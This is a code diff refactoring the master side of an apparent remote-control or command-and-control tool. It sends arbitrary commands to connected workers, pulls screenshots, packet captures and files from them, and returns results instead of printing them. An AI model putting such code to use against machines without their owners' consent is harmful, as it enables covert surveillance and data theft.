@@ -80,14 +80,10 @@ def recv_all(sock):
                 break
     return raw
 
-def send_command(master: Master, worker_id: int, cmd: str, sender="Master"):
+def send_command(master: Master, worker_id: int, cmd: str, sender="Master") -> str:
     worker = master.get_worker(worker_id)
-    if not worker:
-        print(f"[!] No worker with ID {worker_id}")
-        return False
     if cmd.startswith("move") and shlex.split(cmd)[5] == "worker":
-        move_file_to_worker(worker, cmd, sender)
-        return True
+        return move_file_to_worker(worker, cmd, sender)
     else:
         worker["conn"].sendall(Request(method="POST", uri="/exec", body=cmd.encode()).dump())
         log_message(sender, worker["name"], worker["addr"][0], cmd)
@@ -98,28 +94,24 @@ def send_command(master: Master, worker_id: int, cmd: str, sender="Master"):
             path = cmd.split()[1]
             with open(path, "wb") as f:
                 f.write(response.body)
-            print(f"screenshot saved to {path}")
-            return True
+            return f"screenshot saved to {path}"
 
         elif cmd.startswith("sniff") and shlex.split(cmd)[5] == "master":
             path = shlex.split(cmd)[4]
             with open(path, "wb") as f:
                 f.write(response.body)
-            print(f"pcap saved to {path}")
-            return True
+            return f"pcap saved to {path}"
 
         elif cmd.startswith("move") and shlex.split(cmd)[5] == "master":
             path = shlex.split(cmd)[7]
             with open(path, "wb") as f:
                 f.write(response.body)
-            print(f"file from client saved to {path}")
-            return True
+            return f"file from client saved to {path}"
 
         else:
-            print(response.body.decode(errors="replace"))
-            return True
+            return response.body.decode(errors="replace")
 
-def move_file_to_worker(worker, cmd: str, sender="Master"):
+def move_file_to_worker(worker, cmd: str, sender="Master") -> str:
     parts = shlex.split(cmd)
     source_path = parts[1]
     destination_path = parts[7]
@@ -128,5 +120,6 @@ def move_file_to_worker(worker, cmd: str, sender="Master"):
     req = Request(method="POST", uri="/exec", headers={"X-Destination-Path": [destination_path]},
     body=file_bytes)
     worker["conn"].sendall(req.dump())
-    log_message(sender, worker["name"], worker["addr"][0], f"pushed file from {source_path} to {destination_path}")
+    log_message(sender, worker["name"], worker["addr"][0], cmd)
     os.remove(source_path)
+    return f"pushed file from {source_path} to {destination_path}"
